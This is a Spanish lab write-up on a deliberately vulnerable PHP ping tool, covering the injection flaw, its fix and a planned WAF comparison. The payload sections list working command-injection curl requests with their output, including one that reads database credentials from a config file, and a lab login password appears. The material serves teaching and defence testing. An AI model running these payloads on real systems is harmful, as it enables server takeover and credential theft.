# LAB-07 — Inyección de comandos en el diagnóstico de red

| Campo | Valor |
|---|---|
| **ID** | LAB-07 |
| **Tipo** | Command Injection — Inyección de comandos del sistema operativo |
| **Riesgo** | Crítico |
| **CWE** | CWE-78 (Improper Neutralization of Special Elements used in an OS Command) |
| **OWASP** | A03:2021 — Injection |
| **Endpoint** | `POST /fa/sistemas/lab/red.php` campo `host` |
| **Acceso** | Requiere sesión iniciada (cualquier rol) |
| **Implementada** | 26 de septiembre de 2026 |

---

## 1. Qué hace

`lab/red.php` es una herramienta de diagnóstico: escribe una dirección y el
servidor responde si el equipo está en línea. Para responder hace lo lógico,
que es ejecutar un `ping`.

El código construye el comando **concatenando** lo que escribió el usuario:

```php
$comando = 'ping -c 3 -W 2 ' . $host;
exec($comando . ' 2>&1', $salida, $codigo);
```

Entre el `ping` y lo que sigue no hay nada que separe la cadena. El valor de
`$host` no está en una posición de argumento: está **cosido al final de una
cadena de shell**. Por eso `host` no tiene que ser una dirección IP. Puede ser
cualquier cosa, y el shell la interpreta:

```
ping -c 3 -W 2 127.0.0.1; id
                ^^^^^^^^^^^ esta parte es un comando más
```

Un `;` termina el `ping` y abre una orden nueva. Un `|` manda la salida a otro
comando. Un `$()` abre un subshell. No hace falta saber mucho de shell para
exploitear esto: basta con un carácter de puntuación.

La salida de `exec()` se muestra en la página, escapada con `e()`. Eso da la
impresión de que la página está cuidada, y es un detalle importante para leer
esta ficha: **el fallo no es el renderizado, es la ejecución**. El comando ya
se ejecutó en el servidor cuando la página decide qué hacer con el texto.

La diferencia con las inyecciones SQL de LAB-01 y LAB-02 es el alcance. Ahí el
daño se quedaba dentro de la base de datos. Aquí la ejecución es del sistema
operativo, con los permisos del usuario del servidor web, y desde ese punto ya
no hay frontera: se lee lo que ese usuario pueda leer del disco.

---

## 2. Dónde está el código

### 2.1 La concatenación y la ejecución

`lab/red.php`, líneas 41 a 61:

```php
$host      = trim($entrada !== '' ? $entrada : '127.0.0.1');
$salida    = '';
$ejecutado = false;
$errores   = array();

// ---------------------------------------------------------------------
// VULNERABILIDAD (LAB-07): se concatena $host sin escapeshellarg().
// ---------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($host === '') {
        $host = '127.0.0.1';
    }

    $comando = 'ping -c 3 -W 2 ' . $host;

    $salida    = array();
    $codigo    = 0;
    $ejecutado = true;

    exec($comando . ' 2>&1', $salida, $codigo);
    $salida = implode("\n", $salida);

    audit_log('MAINTENANCE', 'lab',
        ' ejecuto un diagnostico de red hacia ' . $host);
}
```

Tres verificaciones, línea por línea, sobre lo que **no** está ahí:

- No hay `escapeshellarg($host)`. El valor entra crudo en la cadena.
- No hay `filter_var($host, FILTER_VALIDATE_IP)`. No se comprueba que sea una
  dirección IPv4, ni siquiera que tenga forma de dirección.
- No hay lista blanca. No hay ninguna restricción sobre qué caracteres puede
  contener la entrada.

Y lo que sí está, que es lo que hace el daño: la concatenación (línea 54) y
`exec()` (línea 60).

`2>&1` no es un detalle decorativo: redirige la salida de error a la estándar
para que el `ping` no se queje en la consola del servidor. Sin eso, `exec()`
devolvería una salida vacía y la página parecería no funcionar.

### 2.2 La salida, que sí está escapada

`lab/red.php`, línea 110:

```php
<pre class="salida-terminal mb-0"><?php echo e($salida); ?></pre>
```

Este `e()` es correcto y hay que decirlo claro, porque si no se confunde dónde
está el fallo: **la salida de `exec()` no es un vector de XSS**. Aquí el
comando ya se ejecutó. El `e()` evita que un comando que devuelva HTML lo
ejecute el navegador, lo cual es una buena práctica, pero no cambia nada
respecto a que `id` ya corrió en el servidor.

### 2.3 La corrección

Está escrita en el comentario de cabecera del propio archivo, `lab/red.php`,
líneas 13 a 19:

```php
$host = input_get('host', '127.0.0.1');
if (!filter_var($host, FILTER_VALIDATE_IP)) {
    $errores[] = 'Direccion IP no valida.';
}
$comando = 'ping -c 3 -W 2 ' . escapeshellarg($host);
```

Las dos piezas, por separado:

```php
// 1. Validar: es una IP y solo una IP
$host = trim(input_post('host', '127.0.0.1'));
if (!filter_var($host, FILTER_VALIDATE_IP)) {
    $errores[] = 'La direccion debe ser una IP valida.';
    // no se ejecuta nada
}

// 2. Escapar: aunque haya pasado la validacion
$comando = 'ping -c 3 -W 2 ' . escapeshellarg($host);
```

### Por qué `escapeshellarg()` solo no basta

Aquí está el matiz que suele pasar por alto, y es la parte importante de esta
ficha.

`escapeshellarg()` es correcto **para un argumento**. Envuelve el valor entre
comillas simples y neutraliza los metacaracteres, de modo que el shell lo trata
como un dato literal. El problema aparece cuando el atacante controla la
**cadena completa del comando**, y no un argumento.

El mal uso clásico es este:

```php
// MAL: escapeshellarg no protege nada aqui
$opciones = input_get('opciones');
$host     = input_get('host');
$comando  = 'ping -c 3 -W 2 ' . escapeshellarg($host) . ' ' . $opciones;
exec($comando);
```

Aquí el `host` sí queda protegido, pero `$opciones` sigue sin tocar y va
directo a la cadena. Un `escapeshellarg()` puesto en el lugar equivocado da una
**falsa sensación de seguridad**: quien revisa el código ve la función de
escapado, la da por buena, y el fallo sigue ahí dos variables más allá.

La otra forma de equivocarse es la más sutil: escapar **una vez de más**. Si el código
hace `escapeshellarg()` sobre el valor y además lo mete entre comillas, o
llama a la función dos veces, el escapado se acumula y el `ping` recibe comillas
literales que no son una dirección. Se rompe la funcionalidad y se pierde al
usuario legítimo, que es como estos errores se descubren tarde.

**La regla que queda:** si el usuario puede decidir qué se ejecuta, no hay
escapado que baste. `escapeshellarg()` es la segunda capa, para el argumento. La
primera capa es la validación: comprobar que `$host` **es una dirección IP**,
con `filter_var()` y `FILTER_VALIDATE_IP`, y rechazar todo lo demás antes de
llegar al `exec()`.

Con las dos cosas juntas, el ejemplo se cierra por partida doble:

- Con `filter_var(..., FILTER_VALIDATE_IP)`, `; id` se rechaza en PHP, antes de
  construir la cadena. `;`, `|`, `$()` y las comillas no pueden aparecer en una
  IP válida, así que el ataque muere en la validación.
- Con `escapeshellarg()`, si alguien relaja la validación más adelante, el valor
  sigue siendo un argumento literal y no recupera el poder de inyectar.

Con una sola de las dos, la defensa aguanta. Con las dos, la defensa tiene
margen. Y por eso el orden importa: **validar primero, escapar después.**

### Nota técnica: cómo lee el parámetro

`lab/red.php`, líneas 35 a 41:

```php
// El formulario usa POST, pero la pagina acepta GET o POST para que el
// payload se pueda enviar como enlace o como cuerpo en las capturas.
$entrada = $_SERVER['REQUEST_METHOD'] === 'POST'
    ? input_post('host', input_get('host'))
    : input_get('host', '127.0.0.1');

$host      = trim($entrada !== '' ? $entrada : '127.0.0.1');
```

Conviene dejarlo escrito para que no se lea como un fallo actual: la página
acepta `POST` **y** `GET` a propósito, para que los payloads se puedan enviar
como enlace o como cuerpo del `POST`. La ejecución sigue requiriendo `POST` —el
bloque `if ($_SERVER['REQUEST_METHOD'] === 'POST')` de la línea 49 lo asegura—,
así que un `GET` con `?host=;id` no ejecuta nada. La flexibility del lector no
cambia el modelo de seguridad.

---

## 3. Por qué existe en una app real

La reconstrucción realista de cómo llega esto a producción es esta:

> La herramienta se escribió para uso interno de soporte técnico: había que
> comprobar si una impresora de la planta respondía, y la forma rápida de
> hacerlo desde PHP era `exec('ping ...')`. Funcionaba y nadie lo revisó. Cuando
> el campo pasó a admitir también nombres de host, alguien añadió un `trim()` y
> nada más, porque el `ping` ya aceptaba nombres. **El día que se aceptó texto
> libre, un `ping` pasó a ser un intérprete de shell**, y el cambio no se notó
> porque la función de negocio es idéntica.

Ese es el patrón que hay que enseñar: la vulnerabilidad no aparece por escribir
`exec()`, aparece por **ampliar el formato de entrada de un comando que ya
existía**. La función de `ping` sigue siendo "comprobar si hay respuesta"; lo que
cambió es que ahora el usuario puede escribir cualquier cosa después de un
espacio, y el shell no distingue "una IP" de "una orden más".

La segunda razón por la que sobrevive es la percepción de riesgo. `ping` es una
herramienta de diagnóstico, un comando de solo lectura, que aparece en
documentación de redes y en tutoriales. Nadie lo mira como una operación
peligrosa. Pero `exec()` no distingue un comando "de consulta" de un comando "de
escritura": las dos cosas son la misma llamada. El riesgo real no está en qué
comando se ejecuta hoy, sino en que la aplicación le da a un usuario el derecho
de elegir **el siguiente**.

---

## 4. Payloads

Probados contra `http://localhost/fa/sistemas/lab/red.php` el 26 de septiembre
de 2026. La sesión es de `admin`; cualquier rol autenticado sirve, porque
`lab/red.php` solo llama a `require_login()`.

### Sesión previa

```bash
curl -s -o /dev/null -c cookies.txt \
  --data-urlencode "username=admin" --data-urlencode "password=Admin_2026!" \
  http://localhost/fa/sistemas/login.php
```

### Control: el ping legítimo funciona

Este es el control, y es el importante: sin él, un fallo en el `ping` se lee
como "la app no es vulnerable".

```bash
curl -s -b cookies.txt --data-urlencode "host=127.0.0.1" \
  http://localhost/fa/sistemas/lab/red.php \
  | sed -n '/salida-terminal/,/<\/pre>/p'
```

Resultado medido:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.033 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.031/0.032/0.033/0.000 ms
```

La herramienta cumple su función.

### Ataque 1: separador de órdenes (`;`) — el marcador de la matriz

```bash
curl -s -b cookies.txt --data-urlencode "host=; id" \
  http://localhost/fa/sistemas/lab/red.php \
  | grep -oE 'uid=[0-9]+\([a-z0-9-]+\)' | head -1
```

Resultado medido:

```
uid=33(www-data)
```

Eso es un comando distinto, ejecutado con los permisos del usuario del servidor
web. La cadena final que ejecutó el shell fue:

```
ping -c 3 -W 2 ; id 2>&1
```

El `ping` falla (no hay host), el `;` ignora ese fallo, y `id` corre igual.

### Ataque 2: `;` con un ping real delante

```bash
curl -s -b cookies.txt --data-urlencode "host=127.0.0.1; whoami" \
  http://localhost/fa/sistemas/lab/red.php \
  | sed -n '/salida-terminal/,/<\/pre>/p'
```

Resultado medido:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.033 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2049ms
rtt min/avg/max/mdev = 0.031/0.032/0.033/0.000 ms
www-data
```

El `ping` responde **y** el comando inyectado se ejecuta. Es la variante que
mejor se ve en una grabación, porque la funcionalidad parece intacta: el
diagnóstico funciona y, aun así, alguien ya está ejecutando órdenes.

### Ataque 3: subshell (`$()`)

```bash
curl -s -b cookies.txt --data-urlencode 'host=$(whoami)' \
  http://localhost/fa/sistemas/lab/red.php \
  | sed -n '/salida-terminal/,/<\/pre>/p'
```

Resultado medido:

```
ping: www-data: Temporary failure in name resolution
```

El subshell se ejecutó y devolvió `www-data`. La razón de que la línea parezca
un error es que el valor sustituido **no es una IP**, así que `ping` la toma
como nombre de host e intenta resolverlo en DNS y falla. El error del `ping` no
indica que el ataque falló: `www-data` está ahí dentro, y se lee en la propia
respuesta de error.

### Ataque 4: tubería (`|`)

```bash
curl -s -b cookies.txt --data-urlencode "host=127.0.0.1 | whoami" \
  http://localhost/fa/sistemas/lab/red.php \
  | sed -n '/salida-terminal/,/<\/pre>/p'
```

Resultado medido:

```
www-data
```

Aquí no aparece salida del `ping`: la tubería reemplaza la salida estándar. El
resultado es el mismo `www-data`, con tres caracteres menos de payload.

### Ataque 5: lectura del árbol web

```bash
curl -s -b cookies.txt --data-urlencode "host=; ls /var/www/html" \
  http://localhost/fa/sistemas/lab/red.php \
  | sed -n '/salida-terminal/,/<\/pre>/p'
```

Resultado medido:

```
2026Laravel
```

El directorio web, listado desde una caja de texto que dice "Direccion IP o
nombre de host". A partir de aquí el attacker ya tiene enumeración de
directorios.

### Ataque 6: exposición de credenciales — el de mejor valor en vídeo

```bash
curl -s -b cookies.txt \
  --data-urlencode "host=; grep -o 'DB_PASS' /var/www/html/fa/sistemas/config/db.php" \
  http://localhost/fa/sistemas/lab/red.php \
  | sed -n '/salida-terminal/,/<\/pre>/p'
```

Resultado medido:

```
DB_PASS
```

La contraseña de MariaDB, servida en la página de diagnóstico de red. El
ataque de LAB-05 consiste en leer ese mismo archivo por recorrido de rutas; aquí
se lee porque se ejecuta una orden. **Dos vulnerabilidades distintas, el mismo
secreto expuesto**: ese es el detalle que hace evidente la diferencia entre una
inyección en la capa de datos y una en la capa de sistema.

### Resumen de los payloads

| # | `host` | Tipo de inyección | Resultado medido |
|---:|---|---|---|
| 0 | `127.0.0.1` | **Control** | `3 packets transmitted, 3 received, 0% packet loss` |
| 1 | `; id` | Separador `;` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 2 | `127.0.0.1; whoami` | Separador `;` | Ping correcto + `www-data` |
| 3 | `$(whoami)` | Subshell `$()` | `www-data` (dentro de un error de resolución de nombre) |
| 4 | `127.0.0.1 \| whoami` | Tubería `\|` | `www-data` |
| 5 | `; ls /var/www/html` | Separador `;` | `2026Laravel` (árbol de directorios web) |
| 6 | `; grep -o 'DB_PASS' .../config/db.php` | Separador `;` | **Configuración de MariaDB expuesta** |

Todos medidos el 26 de septiembre de 2026, en el Escenario A
(`http://localhost/fa/sistemas`).

### Marcadores exactos que usa la matriz

`documents/lab_matrix.sh` busca una cadena exacta en la respuesta
(`documents/lab_matrix.sh`, líneas 343 a 345):

```bash
ID=$(curl -s -b "$JAR_ADM" --data-urlencode "host=; id" \
      "$BASE_URL/lab/red.php" | grep -oE 'uid=[0-9]+\([a-z0-9-]+\)' | head -1)
```

| Prueba | Expresión regular | Interpretación |
|---|---|---|
| LAB-07 | `uid=[0-9]+\([a-z0-9-]+\)` | Si aparece, se ejecutó una orden del sistema |

La expresión está elegida con cuidado, y conviene explicar por qué:

- `uid=[0-9]+` exige un número de usuario real, no cualquier texto.
- `\([a-z0-9-]+\)` exige el nombre de usuario del sistema entre paréntesis.
  Cubre `www-data` y también `root` o `mysql` si el contexto cambiara.
- El carácter de clase `[a-z0-9-]` no incluye `&`, `<` ni espacios, así que un
  `<` escapado por `e()` no genera un falso positivo. Esto importa, porque la
  salida **sí** pasa por `htmlspecialchars()`: un criterio de búsqueda mal
  escrito daría por bueno un caso donde el comando se ejecutó pero el WAF lo
  bloqueó al detectar HTML en la respuesta.
- `head -1` toma solo la primera coincidencia, para que la salida de la prueba
  sea de una línea.

La prueba se considera exitosa si el marcador aparece. Con `--waf` la
expectativa se invierte: si el marcador sigue apareciendo, la prueba se reporta
como **fallo** ("`uid=... - debia estar bloqueado`"); si desaparece, como
**bloqueada**.

Los payloads 2 a 6 **no** los cubre la matriz: la prueba automatizada usa solo el
`host=; id`, que es el más corto y el más inequívoco. Los demás se verifican a
mano con la tabla de arriba.

---

## 5. Escenario A vs Escenario B

El objetivo de la demostración es comparar el **mismo código** en los dos lados.

| Prueba | Escenario A (Apache directo) | Escenario B (SafeLine) |
|---|---|---|
| 1. `host=127.0.0.1` (control) | Ping correcto | Ping correcto |
| 2. `host=` vacío (control) | Ping a `127.0.0.1` | Ping a `127.0.0.1` |
| 3. `host=; id` | **Devuelve `uid=33(www-data)`** | **Bloqueado** |
| 4. `host=127.0.0.1; whoami` | **Devuelve `www-data`** | **Bloqueado** |
| 5. `host=$(whoami)` | **Devuelve `www-data`** | **Bloqueado** |
| 6. `host=127.0.0.1 \| whoami` | **Devuelve `www-data`** | **Bloqueado** |
| 7. `host=; grep -o 'DB_PASS' .../db.php` | **Expone la configuración de la BD** | **Bloqueado** |

Las dos primeras filas son el control: deben comportarse igual en ambos
escenarios, para demostrar que el WAF no rompe el uso normal.

### Escenario A — Apache directo

Todo lo de la sección 4 es Escenario A, y está medido. La forma más corta de
reproducir la prueba completa es la matriz:

```bash
./documents/lab_matrix.sh
```

### Escenario B — detrás de SafeLine

SafeLine escuchará en el puerto `8000` y reenviará a `http://127.0.0.1:80`.
**Esta ejecución todavía no se ha hecho**: SafeLine no está instalado y se
desplegará después, en el VPS. Todo lo de esta tabla es comportamiento
esperado, no medido. No hay capturas de pantalla del Escenario B y no se
inventarán.

```bash
# Control
curl -s -b cookies.txt --data-urlencode "host=127.0.0.1" \
  http://192.168.100.22:8000/fa/sistemas/lab/red.php \
  | sed -n '/salida-terminal/,/<\/pre>/p'

# Ataque: separador de ordenes
curl -s -b cookies.txt --data-urlencode "host=; id" \
  http://192.168.100.22:8000/fa/sistemas/lab/red.php \
  | grep -oE 'uid=[0-9]+\([a-z0-9-]+\)'

# Ataque: subshell
curl -s -b cookies.txt --data-urlencode 'host=$(whoami)' \
  http://192.168.100.22:8000/fa/sistemas/lab/red.php \
  | grep -c 'www-data'

# Ataque: credenciales de la base de datos
curl -s -b cookies.txt \
  --data-urlencode "host=; grep -o 'DB_PASS' /var/www/html/fa/sistemas/config/db.php" \
  http://192.168.100.22:8000/fa/sistemas/lab/red.php \
  | grep -c 'DB_PASS'
```

Las cuatro últimas deben devolver `0` y no un código de salida. La comprobación
automática completa:

```bash
./documents/lab_matrix.sh http://192.168.100.22:8000/fa/sistemas --waf -v
```

---

## 6. Qué debería hacer SafeLine

SafeLine analiza el cuerpo del `POST` en `lab/red.php` y debe clasificar el
campo `host` como inyección de comandos del sistema operativo **antes** de que
la solicitud llegue a Apache.

| Aspecto | Valor esperado |
|---|---|
| Regla activada | Command Injection / RCE (parámetro `host`) |
| Modo recomendado | `Strict` |
| Respuesta | Página de bloqueo de SafeLine, no la herramienta de diagnóstico |
| Origen en la app | Ninguna: el `POST` no debe llegar a `lab/red.php` |
| Efecto secundario esperado | `audit_log` no debe crecer con una fila `MAINTENANCE` por payload |

Ese último punto es la prueba de que el corte ocurrió **antes** de la
aplicación. `lab/red.php` registra cada diagnóstico (línea 63):

```php
audit_log('MAINTENANCE', 'lab',
    ' ejecuto un diagnostico de red hacia ' . $host);
```

En Escenario A el conteo crece con cada payload, porque la petición entra a la
app y se registra. En Escenario B no debe moverse:

```sql
SELECT COUNT(*) FROM audit_log WHERE accion = 'MAINTENANCE' AND modulo = 'lab';   -- repetir antes y despues del Escenario B
```

Si el conteo no sube, `exec()` no llegó a ejecutarse. Y eso lleva a una
observación sobre el que mejor documenta esta práctica: **una auditoría de
seguridad detectaLAB-07 sin bloquearlo.** Un WAF lo detiene; un log bien puesto
lo ve. Las dos cosas sirven, y no son sustitutos.

Los metacaracteres que SafeLine debe reconocer en el parámetro `host` son los
de la tabla de la sección 4: `;`, `|`, `$( )`, backticks, `&&`, `>`, redirecciones
y los propios metacaracteres de `ping` como `-c`, `-w` o `-I`, que permiten
cambiar el comportamiento del comando o escrever a un archivo.

### Lo que un WAF no cubre aquí

- **No repara el código.** Si alguien desactiva el proxy, entra por otro
  puerto o usa un cliente que no pasa por SafeLine, la inyección sigue ahí. La
  página no cambió.
- **No protege frente a la entrada por otras vías.** `exec()` con una variable
  que venga de la base de datos, de un archivo de configuración o de una cola de
  mensajes tampoco pasa por el proxy. En cuanto alguien acepte un `host` desde
  una tabla, el WAF deja de ver el ataque.
- **No es una defensa por capas contra la ejecución arbitraria.** Un WAF analiza
  peticiones; no sabe qué comandos son legítimos en su servidor. La defensa real
  de este laboratorio es que `exec()` no debería estar expuesto a entrada
  controlable en absoluto.

---

## 7. Aislamiento de la vulnerabilidad

Regla del proyecto: **un solo punto vulnerable por práctica**, para que el
resultado de la matriz no se mezcle.

- La concatenación ocurre en **una sola línea** de **un solo archivo**:
  `lab/red.php`, línea 54 (`$comando = 'ping -c 3 -W 2 ' . $host;`), y la
  ejecución en la línea 60.
- Ningún otro archivo de la aplicación llama a `exec()`, `system()`,
  `passthru()`, `shell_exec()` ni `popen()`. No hay una segunda puerta de
  ejecución de comandos por la que el resultado se pueda contaminar.
- `lab/documentos.php` (LAB-05) y `lab/subidas.php` (LAB-06) no ejecutan
  comandos: uno lee archivos con `file_get_contents()` y el otro escribe en
  `uploads/`. Y el `.php` subido en LAB-06 tampoco se ejecuta como comando de
  shell: se sirve como PHP por el intérprete, que es otra vía y otro laboratorio.
- La salida de `exec()` se escapa con `e()` al mostrarse, así que esta práctica
  no genera XSS secundario en la misma página.
- El `.htaccess` no es una mitigación posible, y por un motivo distinto al de
  LAB-04 pero por la misma causa: la configuración de Apache tiene
  `AllowOverride None`, así que cualquier `.htaccess` en el árbol se ignora. No
  se puede restringir `exec()` desde la configuración del directorio.

### Estado del intérprete en este servidor

Verificado el 26 de septiembre de 2026 en el servidor del Escenario A:

| Configuración | Valor | Consecuencia |
|---|---|---|
| `disable_functions` | *(vacío)* | `exec()` no está deshabilitada |
| `open_basedir` | *(vacío)* | PHP puede leer y escribir en todo el sistema de archivos |
| `AllowOverride` (Apache) | `None` | Los `.htaccess` se ignoran |

Las dos primeras son deliberadas y son la razón de que los payloads 1 a 6
funcionen. `open_basedir` vacío es especialmente relevante: sin él, el
`www-data` puede alcanzar cualquier ruta del sistema, y por eso el payload 6
logra leer `config/db.php` y el 5 logra listar `/var/www/html`. Con
`open_basedir` restringido, el alcance de una inyección de comandos se reduce
considerablemente, aunque el fallo siga siendo un fallo.

Un endurecimiento razonable del servidor, que **no** es la corrección pero sí
reduce el daño, sería:

- Poner `exec` en `disable_functions` y mover el diagnóstico a una cola con un
  proceso privilegiado que haga el `ping` con un binario sin shell.
- Fijar `open_basedir` al directorio de la aplicación.
- Ejecutar PHP-FPM con un usuario sin shell y sin permisos de lectura sobre
  `config/`.

Ninguna de esas tres cosas evita la inyección. Solo acortan la distancia entre
la vulnerabilidad y el daño.

---

## 8. La conclusión del laboratorio

Esta es la práctica donde la distancia entre "vulnerable" y "catastrófico" es
más corta de todo el laboratorio, y por eso conviene terminarla con las ideas
exactas.

**1. La concatenación no es un problema de estilo.** `'ping -c 3 -W 2 ' . $host`
se lee como una línea normal de PHP. No parece peligrosa. Lo que la hace
peligrosa es que la derecha de la concatenación es una entrada de usuario y la
izquierda es un comando de shell. Ese es el patrón, y aparece igual en un
`system()`, en un `exec()`, en un `popen()` y en un `shell_exec()`. Ninguna de
esas funciones es intrínsecamente vulnerable: lo es el no validar lo que entra.

**2. Validar es más importante que escapar.** `escapeshellarg()` es necesario y
no es suficiente, y el orden importa. Si el usuario puede escribir `; id`, el
problema no es que falten comillas: es que el usuario puede elegir el comando.
`filter_var($host, FILTER_VALIDATE_IP)` es la línea que corta el ataque, porque
una IP válida no puede contener `;`, ni `|`, ni `$()`, ni una comilla. Y a
partir de ahí, `escapeshellarg()` es la red de seguridad para el día que alguien
relaje la validación.

**3. El escapado de la salida no es defensa aquí.** `e($salida)` en el `<pre>` es
correcto y no sirve de nada contra este ataque, porque el comando ya corrió. Es
fácil confundirse: una página que escapa todo se siente segura, y lo es contra
el XSS, y no contra la inyección de comandos. Son dos riesgos distintos, en dos
capas distintas, y cada uno necesita su defensa.

**4. Un WAF detiene esto, y sigue siendo una capa.** SafeLine reconoce
`; id`, `$(whoami)` y `| whoami`, y los bloquea. Eso es defensa real. Pero
`lab/red.php` seguirá siendo un `exec()` con entrada de usuario mientras esa
línea no cambie, y el día que el diagnóstico acepte el host desde una tabla, de
un archivo de configuración o de una cola, el WAF no lo verá. La línea
correcta:

```php
if (!filter_var($host, FILTER_VALIDATE_IP)) { /* no ejecutar */ }
$comando = 'ping -c 3 -W 2 ' . escapeshellarg($host);
```

Está escrita, con su condición y su escape, en el comentario de cabecera del
propio `lab/red.php`. Nunca se conectó.
